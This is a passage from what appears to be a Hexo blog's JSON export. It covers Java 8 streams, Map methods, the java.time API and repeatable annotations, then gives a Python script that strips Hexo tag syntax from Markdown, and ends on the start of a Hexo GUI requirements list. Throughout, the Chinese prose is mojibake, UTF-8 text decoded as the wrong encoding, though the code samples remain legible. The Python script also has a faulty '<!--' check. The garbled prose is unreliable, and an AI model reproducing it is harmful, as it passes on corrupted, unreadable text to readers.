æ­¤æ‚¨å¯ä»¥åœ¨ä¸€è¡Œä¸­é“¾æ¥å¤šä¸ªæ–¹æ³•è°ƒç”¨ã€‚æµæ˜¯åœ¨æºæ–‡ä»¶ä¸Šåˆ›å»ºçš„ï¼Œä¾‹å¦‚java.util.Collectionï¼Œå¦‚åˆ—è¡¨æˆ–é›†åˆ(ä¸æ”¯æŒæ˜ å°„)ã€‚æµæ“ä½œå¯ä»¥é¡ºåºæ‰§è¡Œï¼Œä¹Ÿå¯ä»¥å¹¶è¡Œæ‰§è¡Œã€‚ è®©æˆ‘ä»¬é¦–å…ˆçœ‹çœ‹é¡ºåºæµæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬ä»¥å­—ç¬¦ä¸²åˆ—è¡¨çš„å½¢å¼åˆ›å»ºä¸€ä¸ªç¤ºä¾‹æº: List&lt;String> stringCollection = new ArrayList&lt;>();stringCollection.add(\"ddd2\");stringCollection.add(\"aaa2\");stringCollection.add(\"bbb1\");stringCollection.add(\"aaa1\");stringCollection.add(\"bbb3\");stringCollection.add(\"ccc\");stringCollection.add(\"bbb2\");stringCollection.add(\"ddd1\"); Java 8ä¸­çš„é›†åˆè¢«æ‰©å±•äº†ï¼Œæ‰€ä»¥ä½ å¯ä»¥é€šè¿‡è°ƒç”¨Collection.stream()æˆ–Collection.parallelStream()ç®€å•åœ°åˆ›å»ºæµã€‚ä¸‹é¢çš„éƒ¨åˆ†è§£é‡Šäº†æœ€å¸¸è§çš„æµæ“ä½œã€‚ Filter Filteræ¥å—ä¸€ä¸ªè°“è¯(predicate)æ¥è¿‡æ»¤æµä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚è¿™ä¸ªæ“ä½œæ˜¯ä¸­é—´çš„ï¼Œå®ƒä½¿æˆ‘ä»¬èƒ½å¤Ÿå¯¹ç»“æœè°ƒç”¨å¦ä¸€ä¸ªæµæ“ä½œ(forEach)ã€‚ForEach æ¥å—è¦ä¸ºè¿‡æ»¤æµä¸­çš„æ¯ä¸ªå…ƒç´ æ‰§è¡Œçš„ä½¿ç”¨è€…ã€‚ForEachæ˜¯ä¸€ä¸ªç»ˆç«¯æ“ä½œã€‚å®ƒæ˜¯voidçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è°ƒç”¨å¦ä¸€ä¸ªæµæ“ä½œã€‚ stringCollection .stream() .filter((s) -> s.startsWith(\"a\")) .forEach(System.out::println);// \"aaa2\", \"aaa1\" Sorted Sortedæ˜¯ä¸€ä¸ªä¸­é—´æ“ä½œï¼Œå®ƒè¿”å›æµçš„æ’åºè§†å›¾ã€‚å…ƒç´ æŒ‰è‡ªç„¶é¡ºåºæ’åºï¼Œé™¤éä¼ é€’è‡ªå®šä¹‰Comparatorã€‚ stringCollection .stream() .sorted() .filter((s) -> s.startsWith(\"a\")) .forEach(System.out::println);// \"aaa1\", \"aaa2\" ==è¯·è®°ä½ï¼Œsortedåªåˆ›å»ºæµçš„æ’åºè§†å›¾ï¼Œè€Œä¸æ“ä½œåå°é›†åˆçš„é¡ºåºã€‚stringCollectionçš„é¡ºåºæ˜¯ä¸å˜çš„:== System.out.println(stringCollection);// ddd2, aaa2, bbb1, aaa1, bbb3, ccc, bbb2, ddd1 Map ä¸­é—´æ“ä½œæ˜ å°„(Map)é€šè¿‡ç»™å®šçš„å‡½æ•°å°†æ¯ä¸ªå…ƒç´ è½¬æ¢ä¸ºå¦ä¸€ä¸ªå¯¹è±¡ã€‚ä¸‹é¢çš„ç¤ºä¾‹å°†æ¯ä¸ªå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™å­—ç¬¦ä¸²ã€‚ä½†æ˜¯æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨mapå°†æ¯ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¦ä¸€ç§ç±»å‹ã€‚ç»“æœæµçš„æ³›å‹ç±»å‹å–å†³äºä¼ é€’ç»™mapçš„å‡½æ•°çš„æ³›å‹ç±»å‹ã€‚ // æ˜ å°„map ä»å°å†™å˜æˆå¤§å†™, å¹¶æŒ‰ç…§ä»å°åˆ°å¤§æ’åºstringCollection .stream() .map(String::toUpperCase) .sorted((a, b) -> b.compareTo(a)) .forEach(System.out::println);// \"DDD2\", \"DDD1\", \"CCC\", \"BBB3\", \"BBB2\", \"AAA2\", \"AAA1\" Match å¯ä»¥ä½¿ç”¨å„ç§åŒ¹é…æ“ä½œæ¥æ£€æŸ¥æŸä¸ªè°“è¯æ˜¯å¦ä¸æµåŒ¹é…ã€‚æ‰€æœ‰è¿™äº›æ“ä½œéƒ½æ˜¯terminalï¼Œå¹¶è¿”å›ä¸€ä¸ªå¸ƒå°”ç»“æœã€‚ // æ˜¯å¦æœ‰è‡³å°‘ä¸€ä¸ªä»¥aå¼€å¤´çš„å­˜åœ¨?boolean anyStartsWithA = stringCollection .stream() .anyMatch((s) -> s.startsWith(\"a\"));System.out.println(anyStartsWithA); // true//æ˜¯å¦å…¨éƒ½æ˜¯ä»¥aå¼€å¤´?boolean allStartsWithA = stringCollection .stream() .allMatch((s) -> s.startsWith(\"a\"));System.out.println(allStartsWithA); // false// æ˜¯å¦ä¸å­˜åœ¨ä»¥zå¼€å¤´?boolean noneStartsWithZ = stringCollection .stream() .noneMatch((s) -> s.startsWith(\"z\"));System.out.println(noneStartsWithZ); // true Count Countæ˜¯ä¸€ä¸ªç»ˆç«¯æ“ä½œï¼Œå°†æµä¸­çš„å…ƒç´ ä¸ªæ•°ä½œä¸ºlongè¿”å›ã€‚ // ä»¥Bå¼€å¤´çš„ä¸ªæ•°long startsWithB = stringCollection .stream() .filter((s) -> s.startsWith(\"b\")) .count();System.out.println(startsWithB); // 3 Reduce è¿™ä¸ªç»ˆç«¯æ“ä½œä½¿ç”¨ç»™å®šå‡½æ•°å¯¹æµä¸­çš„å…ƒç´ è¿›è¡Œè¿˜åŸã€‚ç»“æœæ˜¯ä¸€ä¸ªå¯é€‰(Optional)çš„ä¿å­˜å‡å°‘çš„å€¼ã€‚ Optional&lt;String> reduced = stringCollection .stream() .sorted() .reduce((s1, s2) -> s1 + \"#\" + s2);reduced.ifPresent(System.out::println);// \"aaa1#aaa2#bbb1#bbb2#bbb3#ccc#ddd1#ddd2\" Parallel Streams å¦‚ä¸Šæ‰€è¿°ï¼Œæµå¯ä»¥æ˜¯é¡ºåºçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯å¹¶è¡Œçš„ã€‚é¡ºåºæµä¸Šçš„æ“ä½œåœ¨å•ä¸ªçº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œè€Œå¹¶è¡Œæµä¸Šçš„æ“ä½œåœ¨å¤šä¸ªçº¿ç¨‹ä¸Šå¹¶å‘æ‰§è¡Œã€‚ ä¸‹é¢çš„ç¤ºä¾‹æ¼”ç¤ºäº†é€šè¿‡ä½¿ç”¨å¹¶è¡Œæµæ¥æé«˜æ€§èƒ½æ˜¯å¤šä¹ˆå®¹æ˜“ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ç³»åˆ—ç‹¬ç‰¹å…ƒç´ : int max = 1000000;List&lt;String> values = new ArrayList&lt;>(max);for (int i = 0; i &lt; max; i++) &#123; UUID uuid = UUID.randomUUID(); values.add(uuid.toString());&#125; ç°åœ¨æˆ‘ä»¬æµ‹é‡å¯¹è¿™ä¸ªé›†åˆçš„æµè¿›è¡Œæ’åºæ‰€èŠ±è´¹çš„æ—¶é—´ã€‚ Sequential Sort long t0 = System.nanoTime();long count = values.stream().sorted().count();System.out.println(count);long t1 = System.nanoTime();long millis = TimeUnit.NANOSECONDS.toMillis(t1 - t0);System.out.println(String.format(\"sequential sort took: %d ms\", millis));// sequential sort took: 899 ms Parallel Sort long t0 = System.nanoTime();long count = values.parallelStream().sorted().count();System.out.println(count);long t1 = System.nanoTime();long millis = TimeUnit.NANOSECONDS.toMillis(t1 - t0);System.out.println(String.format(\"parallel sort took: %d ms\", millis));// parallel sort took: 472 ms æ­£å¦‚æ‚¨å¯ä»¥çœ‹åˆ°çš„ï¼Œè¿™ä¸¤ä¸ªä»£ç ç‰‡æ®µå‡ ä¹æ˜¯ç›¸åŒçš„ï¼Œä½†å¹¶è¡Œæ’åºå¤§çº¦å¿«50%ã€‚æ‚¨éœ€è¦åšçš„å°±æ˜¯å°†stream()æ›´æ”¹ä¸ºparallelStream()ã€‚ Map å¦‚å‰æ‰€è¿°ï¼Œæ˜ å°„ä¸æ”¯æŒæµã€‚ç›¸åï¼Œæ˜ å°„ç°åœ¨æ”¯æŒå„ç§æ–°çš„ã€æœ‰ç”¨çš„æ–¹æ³•æ¥å®Œæˆå¸¸è§çš„ä»»åŠ¡ã€‚ Map&lt;Integer, String> map = new HashMap&lt;>();for (int i = 0; i &lt; 10; i++) &#123; map.putIfAbsent(i, \"val\" + i);&#125;map.forEach((id, val) -> System.out.println(val)); ä¸Šé¢çš„ä»£ç åº”è¯¥æ˜¯ä¸è¨€è‡ªæ˜çš„:putIfAbsenté˜»æ­¢æˆ‘ä»¬å†™é¢å¤–çš„if nullæ£€æŸ¥;forEachæ¥å—ä¸€ä¸ªæ¶ˆè´¹è€…æ¥ä¸ºæ˜ å°„çš„æ¯ä¸ªå€¼æ‰§è¡Œæ“ä½œã€‚ è¿™ä¸ªä¾‹å­å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨å‡½æ•°åœ¨maoä¸Šè®¡ç®—ä»£ç : map.computeIfPresent(3, (num, val) -> val + num);map.get(3); // val33map.computeIfPresent(9, (num, val) -> null);map.containsKey(9); // falsemap.computeIfAbsent(23, num -> \"val\" + num);map.containsKey(23); // truemap.computeIfAbsent(3, num -> \"bam\");map.get(3); // val33 æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å­¦ä¹ å¦‚ä½•åˆ é™¤ä¸€ä¸ªç»™å®šé”®çš„æ¡ç›®ï¼Œä»…å½“å®ƒå½“å‰æ˜ å°„åˆ°ä¸€ä¸ªç»™å®šå€¼æ—¶: map.remove(3, \"val3\");map.get(3); // val33map.remove(3, \"val33\");map.get(3); // null å¦ä¸€ä¸ªæœ‰ç”¨çš„æ–¹æ³•: map.getOrDefault(42, \"not found\"); // not found åˆå¹¶ä¸€ä¸ªmapæ¡ç›®æ˜¯å¾ˆå®¹æ˜“çš„: map.merge(9, \"val9\", (value, newValue) -> value.concat(newValue));map.get(9); // val9map.merge(9, \"concat\", (value, newValue) -> value.concat(newValue));map.get(9); // val9concat åˆå¹¶è¦ä¹ˆæŠŠé”®/å€¼æ”¾åˆ°æ˜ å°„ä¸­ï¼Œå¦‚æœé”®ä¸å­˜åœ¨ï¼Œè¦ä¹ˆè°ƒç”¨åˆå¹¶å‡½æ•°æ¥æ”¹å˜ç°æœ‰çš„å€¼ã€‚ Date API Java 8åœ¨Java .timeåŒ…ä¸‹åŒ…å«äº†ä¸€ä¸ªå…¨æ–°çš„æ—¥æœŸå’ŒDate APIã€‚æ–°çš„Date APIå¯ä»¥ä¸J Joda-Timeåº“ç›¸æ¯”è¾ƒï¼Œä½†æ˜¯å®ƒä»¬æ˜¯ä¸åŒçš„ã€‚ä¸‹é¢çš„ç¤ºä¾‹æ¶µç›–äº†è¿™ä¸ªæ–°APIçš„æœ€é‡è¦éƒ¨åˆ†ã€‚ Clock Clockæä¾›å¯¹å½“å‰æ—¥æœŸå’Œæ—¶é—´çš„è®¿é—®ã€‚æ—¶é’ŸçŸ¥é“ä¸€ä¸ªæ—¶åŒºï¼Œå¯ä»¥ç”¨æ¥ä»£æ›¿System.currentTimeMillis()æ¥æ£€ç´¢å½“å‰çš„æ¯«ç§’æ•°ã€‚è¿™ç§æ—¶é—´çº¿ä¸Šçš„ç¬æ—¶ç‚¹ä¹Ÿå¯ä»¥ç”¨Instantç±»è¡¨ç¤ºã€‚instantå¯ç”¨äºåˆ›å»ºé—ç•™çš„java.util.Dateå¯¹è±¡ã€‚ Clock clock = Clock.systemDefaultZone();long millis = clock.millis();Instant instant = clock.instant();Date legacyDate = Date.from(instant); // legacy java.util.Date Timezones æ—¶åŒºç”¨ZoneIdè¡¨ç¤ºã€‚å¯ä»¥é€šè¿‡é™æ€å·¥å‚æ–¹æ³•è½»æ¾åœ°è®¿é—®å®ƒä»¬ã€‚æ—¶åŒºå®šä¹‰äº†åœ¨ç¬é—´å’Œæœ¬åœ°æ—¥æœŸå’Œæ—¶é—´ä¹‹é—´è¿›è¡Œè½¬æ¢æ—¶éå¸¸é‡è¦çš„åç§»é‡ã€‚ System.out.println(ZoneId.getAvailableZoneIds());// prints all available timezone idsZoneId zone1 = ZoneId.of(\"Europe/Berlin\");ZoneId zone2 = ZoneId.of(\"Brazil/East\");System.out.println(zone1.getRules());System.out.println(zone2.getRules());// ZoneRules[currentStandardOffset=+01:00]// ZoneRules[currentStandardOffset=-03:00] LocalTime LocalTimeè¡¨ç¤ºæ²¡æœ‰æ—¶åŒºçš„æ—¶é—´ï¼Œä¾‹å¦‚æ™šä¸Š10ç‚¹æˆ–17:30:15ã€‚ä¸‹é¢çš„ç¤ºä¾‹ä¸ºä¸Šé¢å®šä¹‰çš„æ—¶åŒºåˆ›å»ºä¸¤ä¸ªæœ¬åœ°æ—¶é—´ã€‚ç„¶åæˆ‘ä»¬æ¯”è¾ƒè¿™ä¸¤ä¸ªæ—¶é—´ï¼Œå¹¶è®¡ç®—è¿™ä¸¤ä¸ªæ—¶é—´çš„ LocalTime now1 = LocalTime.now(zone1);LocalTime now2 = LocalTime.now(zone2);System.out.println(now1.isBefore(now2)); // falselong hoursBetween = ChronoUnit.HOURS.between(now1, now2);long minutesBetween = ChronoUnit.MINUTES.between(now1, now2);System.out.println(hoursBetween); // -3System.out.println(minutesBetween); // -239 LocalTimeé™„å¸¦äº†å„ç§å·¥å‚æ–¹æ³•æ¥ç®€åŒ–æ–°å®ä¾‹çš„åˆ›å»ºï¼ŒåŒ…æ‹¬æ—¶é—´å­—ç¬¦ä¸²çš„è§£æã€‚ LocalTime late = LocalTime.of(23, 59, 59);System.out.println(late); // 23:59:59DateTimeFormatter germanFormatter = DateTimeFormatter .ofLocalizedTime(FormatStyle.SHORT) .withLocale(Locale.GERMAN);LocalTime leetTime = LocalTime.parse(\"13:37\", germanFormatter);System.out.println(leetTime); // 13:37 LocalDate LocalDateè¡¨ç¤ºä¸€ä¸ªä¸åŒçš„æ—¥æœŸï¼Œä¾‹å¦‚2014-03-11ã€‚å®ƒæ˜¯ä¸å¯å˜çš„ï¼Œå·¥ä½œæ–¹å¼ä¸LocalTimeå®Œå…¨ç±»ä¼¼ã€‚è¯¥ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•é€šè¿‡å¢åŠ æˆ–å‡å°‘æ—¥ã€æœˆæˆ–å¹´æ¥è®¡ç®—æ–°çš„æ—¥æœŸã€‚è¯·è®°ä½ï¼Œæ¯ä¸ªæ“ä½œéƒ½è¿”å›ä¸€ä¸ªæ–°å®ä¾‹ã€‚ LocalDate today = LocalDate.now();LocalDate tomorrow = today.plus(1, ChronoUnit.DAYS);LocalDate yesterday = tomorrow.minusDays(2);LocalDate independenceDay = LocalDate.of(2014, Month.JULY, 4);DayOfWeek dayOfWeek = independenceDay.getDayOfWeek();System.out.println(dayOfWeek); // FRIDAY ä»å­—ç¬¦ä¸²ä¸­è§£æLocalDateå°±åƒè§£æLocalTimeä¸€æ ·ç®€å•: DateTimeFormatter germanFormatter = DateTimeFormatter .ofLocalizedDate(FormatStyle.MEDIUM) .withLocale(Locale.GERMAN);LocalDate xmas = LocalDate.parse(\"24.12.2014\", germanFormatter);System.out.println(xmas); // 2014-12-24 LocalDateTime LocalDateTimeè¡¨ç¤º**æ—¥æœŸ-æ—¶é—´**ã€‚å®ƒå°†ä¸Šé¢çš„æ—¥æœŸå’Œæ—¶é—´åˆå¹¶åˆ°ä¸€ä¸ªå®ä¾‹ä¸­ã€‚LocalDateTimeæ˜¯ä¸å¯å˜çš„ï¼Œå·¥ä½œåŸç†ç±»ä¼¼äºLocalTimeå’ŒLocalDateã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ–¹æ³•ä»æ—¥æœŸ-æ—¶é—´ä¸­æ£€ç´¢æŸäº›å­—æ®µ: LocalDateTime sylvester = LocalDateTime.of(2014, Month.DECEMBER, 31, 23, 59, 59);DayOfWeek dayOfWeek = sylvester.getDayOfWeek();System.out.println(dayOfWeek); // WEDNESDAYMonth month = sylvester.getMonth();System.out.println(month); // DECEMBERlong minuteOfDay = sylvester.getLong(ChronoField.MINUTE_OF_DAY);System.out.println(minuteOfDay); // 1439 é€šè¿‡é™„åŠ çš„æ—¶åŒºä¿¡æ¯ï¼Œå¯ä»¥å°†å…¶è½¬æ¢ä¸ºç¬é—´ã€‚ç¬é—´å¯ä»¥å¾ˆå®¹æ˜“åœ°è½¬æ¢ä¸ºjava.util.Dateç±»å‹çš„é—ç•™æ—¥æœŸã€‚ Instant instant = sylvester .atZone(ZoneId.systemDefault()) .toInstant();Date legacyDate = Date.from(instant);System.out.println(legacyDate); // Wed Dec 31 23:59:59 CET 2014 æ ¼å¼åŒ–æ—¥æœŸ-æ—¶é—´å°±åƒæ ¼å¼åŒ–æ—¥æœŸæˆ–æ—¶é—´ä¸€æ ·ã€‚æˆ‘ä»¬å¯ä»¥ä»è‡ªå®šä¹‰æ¨¡å¼åˆ›å»ºæ ¼å¼åŒ–å™¨ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é¢„å®šä¹‰çš„æ ¼å¼ã€‚ DateTimeFormatter formatter = DateTimeFormatter .ofPattern(\"MMM dd, yyyy - HH:mm\");LocalDateTime parsed = LocalDateTime.parse(\"Nov 03, 2014 - 07:13\", formatter);String string = formatter.format(parsed);System.out.println(string); // Nov 03, 2014 - 07:13 ä¸java.text.NumberFormatä¸åŒï¼Œæ–°çš„DateTimeFormatteræ˜¯ä¸å¯å˜çš„å’Œçº¿ç¨‹å®‰å…¨çš„ã€‚ Annotations Java 8ä¸­çš„æ³¨é‡Šæ˜¯å¯é‡å¤çš„ã€‚è®©æˆ‘ä»¬ç›´æ¥è¿›å…¥ä¸€ä¸ªä¾‹å­æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªåŒ…è£…æ³¨é‡Šï¼Œå®ƒåŒ…å«ä¸€ä¸ªå®é™…æ³¨é‡Šçš„æ•°ç»„: @interface Hints &#123; Hint[] value();&#125;@Repeatable(Hints.class)@interface Hint &#123; String value();&#125; Java 8å…è®¸æˆ‘ä»¬é€šè¿‡å£°æ˜æ³¨é‡Š@Repeatableæ¥ä½¿ç”¨ç›¸åŒç±»å‹çš„å¤šä¸ªæ³¨é‡Šã€‚ å˜ä½“1:ä½¿ç”¨å®¹å™¨æ³¨é‡Š(æ—§å¼) @Hints(&#123;@Hint(\"hint1\"), @Hint(\"hint2\")&#125;)class Person &#123;&#125; å˜ä½“2:ä½¿ç”¨å¯é‡å¤çš„æ³¨é‡Š(æ–°å­¦æ ¡) @Hint(\"hint1\")@Hint(\"hint2\")class Person &#123;&#125; é€šè¿‡ä½¿ç”¨å˜ä½“2,javaç¼–è¯‘å™¨éšå¼åœ°åœ¨åº•å±‚è®¾ç½®@Hintsæ³¨é‡Šã€‚è¿™å¯¹äºé€šè¿‡åå°„é˜…è¯»æ³¨é‡Šä¿¡æ¯å¾ˆé‡è¦ã€‚ Hint hint = Person.class.getAnnotation(Hint.class);System.out.println(hint); // nullHints hints1 = Person.class.getAnnotation(Hints.class);System.out.println(hints1.value().length); // 2Hint[] hints2 = Person.class.getAnnotationsByType(Hint.class);System.out.println(hints2.length); // 2 å°½ç®¡æˆ‘ä»¬ä»æ¥æ²¡æœ‰åœ¨Personç±»ä¸Šå£°æ˜@Hintsæ³¨é‡Šï¼Œä½†é€šè¿‡getnotation (hint .class)ä»ç„¶å¯è¯»ã€‚ç„¶è€Œï¼Œæ›´æ–¹ä¾¿çš„æ–¹æ³•æ˜¯getAnnotationsByTypeï¼Œå®ƒå…è®¸ç›´æ¥è®¿é—®æ‰€æœ‰å¸¦æ³¨é‡Šçš„@Hinæ³¨é‡Šã€‚ æ­¤å¤–ï¼ŒJava 8ä¸­æ³¨é‡Šçš„ä½¿ç”¨æ‰©å±•åˆ°äº†ä¸¤ä¸ªæ–°çš„ç›®æ ‡: @Target(&#123;ElementType.TYPE_PARAMETER, ElementType.TYPE_USE&#125;)@interface MyAnnotation &#123;&#125;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Java","slug":"æŠ€æœ¯å‘/Java","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/tags/%E6%8A%80%E6%9C%AF%E5%90%91/"}],"author":"sizaif"},{"title":"Pyè‡ªåŠ¨åŒ–è„šæœ¬å®ç°å»é™¤hexoæ ‡ç­¾æ’ä»¶è¯­æ³•","slug":"pyè‡ªåŠ¨åŒ–è„šæœ¬å®ç°å»é™¤hexoæ ‡ç­¾æ’ä»¶è¯­æ³•","date":"2021-08-08T13:26:40.000Z","updated":"2021-09-19T10:15:49.075Z","comments":true,"path":"posts/28f3a3fd/","link":"","permalink":"https://www.sizaif.com/posts/28f3a3fd/","excerpt":"","text":"pyè‡ªåŠ¨åŒ–è„šæœ¬å®ç°å»é™¤hexoæ ‡ç­¾æ’ä»¶è¯­æ³• [TOC] éœ€æ±‚ é±¼å’Œç†ŠæŒä¸å¯å…¼å¾—,å½“é‡‡ç”¨typoraç¼–å†™mdæ–‡æ¡£æ—¶,typoraç­‰å…¶ä»–è½¯ä»¶æ˜¯ä¸æ”¯æŒhexoçš„æ’ä»¶è¯­æ³•çš„,æ•…è€Œä¸ä¼šå®æ—¶æ¸²æŸ“çš„.åªä¼šæ˜¾ç¤ºæºä»£ç : ä¾‹å¦‚ æºç  &#123;% note danger, note error/danger %&#125; &#123;% note success, note done/success %&#125; å½“åŒæ­¥å‘è¡¨åˆ°CSDNç­‰å…¶ä»–åšå®¢æ—¶,ä¼šæŠŠæºä»£ç æ˜¾ç¤ºå‡ºæ¥,æ˜¾å¾—éå¸¸ä¸ç¾è§‚,ä¸”å«æœ‰ä¹±ç . æ•…è€Œå†™ä¸€ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬å»é™¤å«æœ‰ hexo è¯­æ³•çš„ å†…å®¹, å°è¯•è¿˜æºä¸€ä¸ªçº¯å‡€çš„mdæ–‡ä»¶ ä»£ç  code # !/usr/bin/python # -*- coding: utf-8 -*- # @Author: float311@163.com; sizaif2000@163.com # @Description: å°†hexoåšå®¢ä¿®æ”¹ä¸ºcsdnå¯ä»¥ä½¿ç”¨çš„æ ¼å¼ # @Date 2021/8/8 17:59 # @Update 2021-08-09 10:17:50 # @note: # å·²çŸ¥bug: # 1. hexoè¯­æ³•ä¸èƒ½ä¸æ–‡æœ¬æ··ç”¨,å³å¤„åœ¨ä¸€è¡Œä¸­, ä¾‹å¦‚: å¸¦ &#123;% u ä¸‹åˆ’çº¿ %&#125; çš„æ–‡æœ¬ ; ä¼šå¯¼è‡´ æ–‡æœ¬å†…å®¹ä¸¢å¤± # 2. ä»£ç æ¡†ä¸­å†…å®¹ä¹Ÿä¼šè¢«å¤„ç† import sys,re def matchstring(line): # radio, checkout note matchradio = re.search(r'&#123;% [rcn].*',line,re.I) if matchradio: return re.sub( r'%&#125;', \"\", ','.join(line.split(',')[1:]) ).replace(\" \", \"\") # floding timeline, tab end matchall = re.search(r'&#123;% [fte].*',line,re.I) if matchall: # å…¨éƒ¨ä¸¢å¼ƒ return None # link matchlink = re.search(r'&#123;% link .*',line,re.I) if matchlink: temp = line.split(',') line = \"[\"+temp[0].split(' ')[-1]+\"](\"+re.sub(r'%&#125;',\"\",temp[-1])+\")\" return line.strip() # audio,video matchaudio = re.search(r'&#123;% [av].*',line,re.I) if matchaudio: return line.split(' ')[-2].replace(\" \",\"\") # &lt;!--ç±» matchall2 = line.find(\"&lt;!--\") if matchall2: return None def modify(original, result): \"\"\" æ ¹æ®hexo MDæ–‡ä»¶ç”ŸæˆCSDNåšå®¢é€‚ç”¨çš„MDæ–‡ä»¶ :param original: æºæ–‡ä»¶ :param result: æ–°æ–‡ä»¶ \"\"\" content = \"\" with open(original, \"r+\", encoding=\"UTF-8\") as o: for line in o.readlines(): if line.find(\"&#123;%\") == -1 and line.find(\"&lt;!--\"): content += line else: line = matchstring(line) if line is not None: content += line with open(result, \"w+\", encoding=\"UTF-8\") as n: n.write(content) if __name__ == '__main__': original_md = sys.argv[1] + \".md\" result_md = sys.argv[2] + \".md\" modify(original_md, result_md) ä½¿ç”¨æ–¹æ³• # æ–‡ä»¶åä¸éœ€è¦å¸¦md $ py main æºæ–‡ä»¶ è¾“å‡ºæ–‡ä»¶ å·²çŸ¥bug radio,checkout,note æ–‡æœ¬å†…å®¹ä¸­ä¸èƒ½å«æœ‰â€™,'(é€—å·), ä¼šå¯¼è‡´åˆ†å‰²æ•°æ®ä¸¢å¤± hexoè¯­æ³•ä¸èƒ½ä¸æ–‡æœ¬æ··ç”¨,å³å¤„åœ¨ä¸€è¡Œä¸­, ä¾‹å¦‚: å¸¦&#123;% u ä¸‹åˆ’çº¿ %&#125;çš„æ–‡æœ¬; ä¼šå¯¼è‡´æ–‡æœ¬å†…å®¹ä¸¢å¤± ä»£ç æ¡†ä¸­çš„å†…å®¹ä¹Ÿä¼šè¢«å¤„ç† â€‹ ä¸Šé¢çš„æƒ…å†µæš‚æ—¶éœ€è¦æ‰‹åŠ¨å¤„ç† æ„Ÿè°¢ æ„Ÿè°¢ float311@163.com","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Python","slug":"æŠ€æœ¯å‘/Python","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Python/"}],"tags":[{"name":"è„šæœ¬","slug":"è„šæœ¬","permalink":"https://www.sizaif.com/tags/%E8%84%9A%E6%9C%AC/"},{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/tags/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Python","slug":"Python","permalink":"https://www.sizaif.com/tags/Python/"}],"author":"sizaif"},{"title":"Hexo-Gui Project","slug":"hexo-gui-project","date":"2021-08-08T12:35:30.000Z","updated":"2021-08-14T14:15:24.706Z","comments":true,"path":"posts/739d4da5/","link":"","permalink":"https://www.sizaif.com/posts/739d4da5/","excerpt":"","text":"[toc] hexoå›¾å½¢ç•Œé¢ guiéœ€æ±‚æ–‡æ¡£ [ ] éƒ¨ç½²åˆ°github [ ] ä¸€é”®åˆ›å»ºæ–‡ç« ,å¹¶è‡ªåŠ¨èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€_postæ–‡ä»¶å¤¹ [ ] ä¸€é”®åˆ›å»ºpage,å¹¶è‡ªåŠ¨èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€sourceæ–‡ä»¶å¤¹ [ ] ä¸€é”®æœ¬åœ°é¢„è§ˆ [ ] ä¸€é”®ç”Ÿæˆ,å‘å¸ƒåˆ°githubä»“åº“( éœ€è¦é…ç½®ä»“åº“åç§°, å¾…è®¨è®º) [ ] ä¸€é”®æ‰“å¼€æ›´æ”¹hexoé…ç½® [ ] ä¸€é”®æ‰“å¼€æ›´æ”¹hexo ä¸»é¢˜é…ç½® ä¸€é”®åˆ›å»ºæ–‡ç«  å‡ ç§æ–¹æ¡ˆ: é€‰æ‹©å…¶ä¸­ä¸€ç§ [ ] ä¸€é”®åˆ›å»ºæ–‡ç« ,å¹¶è‡ªåŠ¨èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€_postæ–‡ä»¶å¤¹ [ ] ä¸€é”®åˆ›å»ºæ–‡ç« ,å¹¶è‡ªåŠ¨è°ƒç”¨typoraæ‰“å¼€æ–‡ç«  ä¸€é”®åˆ›å»ºpage æ–¹æ¡ˆé›·åŒ åˆ›å»ºæ–‡ç«  ä¸€é”®æœ¬åœ°é¢„è§ˆ $ hexo s -g ä¸€é”®ç”Ÿæˆ,å‘å¸ƒåˆ°githubä»“åº“ è‹¥ç›´æ¥è°ƒç”¨ $ hexo s -d åˆ™ä¼šäº¤äº’è¦æ±‚è¾“å…¥ githubç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯ ä¸æƒ³äº¤äº’è¾“å…¥çš„è¯, æå‰è®¾å®š ç”¨æˆ·åå’Œå¯†ç  ä½¿ç”¨sshkey gitæ¨é€ ä¸€é”®æ‰“å¼€è®¾ç½®hexoé…ç½® ç±»åŒ æ›´æ”¹hexoä¸»é¢˜é…ç½® ä¸€é”®æ‰“å¼€æ›´æ”¹hexo ä¸»é¢˜é…ç½® éœ€è¦åœ¨hexo æ ¹ç›®å½•ä¸‹ æ–°å»º_config.ä¸»é¢˜.yml è°ƒç”¨ ç¨‹åºæ‰“å¼€, æˆ–è€… æ‰“å¼€æ‰€åœ¨æ–‡ä»¶å¤¹,æˆ–è€… æ ¹æ®ä¸»é¢˜ä¸€é”®éƒ¨ç½²(å¾…è®¨è®º, 